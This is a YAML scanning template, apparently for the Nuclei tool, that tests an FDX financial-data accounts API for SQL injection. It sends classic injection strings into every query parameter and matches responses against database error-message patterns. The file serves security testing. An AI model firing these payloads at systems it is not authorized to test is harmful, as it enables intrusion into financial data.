id: FDX-API-Security-Tests-SQLi

info:
  name: FDX API Sanity Tests SQLi
  author: 0x240x23elu & OFJAAAH & vtobi
  severity: critical
  description: |
    FDX API Sanity SQL injection Tests .
  reference:
    - https://www.financialdataexchange.org/FDX/FDX/News/Press-Releases/Financial_Data_Exchange_Releases_FDX_API_5.0.aspx
  tags: fdx


requests:
  - raw:
      - |
        GET /fdx/v4/accounts?accountIds=§sqli§&startTime=§sqli§&endTime=§sqli§&resultType=lightweight&offset=§sqli§&limit=§sqli§ HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{JWT}} 
        Connection: keep-alive
    payloads:
      sqli:
         - {{url_encode(" 1 or 1")}}
         - {{url_encode(" %22%22|0;#")}}
         - {{url_encode(" ''")}}
         - {{url_encode(" ' or#")}}
         - {{url_encode(" ' OR '1")}}
         - {{url_encode(" ' OR 1 -- -")}}
         - {{url_encode(" %22 OR 1 = 1 -- -#")}}
         - {{url_encode(" %22%22|0;#")}}
         - {{url_encode(" OR 1=1")}}
         - {{url_encode(" AND 1")}}
         - {{url_encode(" AND 0")}}
         - {{url_encode(" AND true")}}
         - {{url_encode(" AND false")}}
         - {{url_encode(" 1-false")}}
         - {{url_encode(" 1-true")}}
         - {{url_encode(" 1*56")}}
         - {{url_encode(" -2")}}
         - {{url_encode(" 1' ORDER BY 1--+")}}
         - {{url_encode(" 1' ORDER BY 2--+")}}
         - {{url_encode(" 1' ORDER BY 3--+")}}
         - {{url_encode(" 1' ORDER BY 1,2--+")}}
         - {{url_encode(" 1' ORDER BY 1,2,3--+")}}
         - {{url_encode(" 1' GROUP BY 1,2,--+")}}
         - {{url_encode(" 1' GROUP BY 1,2,3--+")}}
         - {{url_encode(" ' GROUP BY columnnames having 1=1 --")}}
    attack: batteringram

    extractors:
      - type: regex
        part: body
        regex:
          - "SQL syntax.*MySQL|Warning.*mysql_.*|valid MySQL result|MySqlClient.|mysqli_error|mysqli_query"
          - "PostgreSQL.*ERROR|Warning.*Wpg_.*|valid PostgreSQL resultNpgsql."
#          - "Driver.* SQL[-_ ]*Server|OLE DB.* SQL Server|(W|A)SQL Server.*Driver|Warning.*mssql_.*|(W|A)SQL Server.*[0-9a-fA-F]{8}|(?s)Exception.*WSystem.Data.SqlClient.|(?s)Exception.*WRoadhouse.Cms.)"
          - "Microsoft Access Driver|JET Database Engine|Access Database Engine"
          - "ORA-[0-9][0-9][0-9][0-9]|Oracle error|Oracle.*Driver|Warning.*Woci_.*|Warning.*Wora_.*"
          - "CLI Driver.*DB2|DB2 SQL error|bdb2_w+"
          - "SQLite/JDBCDriver|SQLite.Exception|System.Data.SQLite.SQLiteException|Warning.*sqlite_.*|Warning.*SQLite3::|SQLITE_ERROR"
          - "(?i)Warning.*sybase.*|Sybase message|Sybase.*Server message.*"
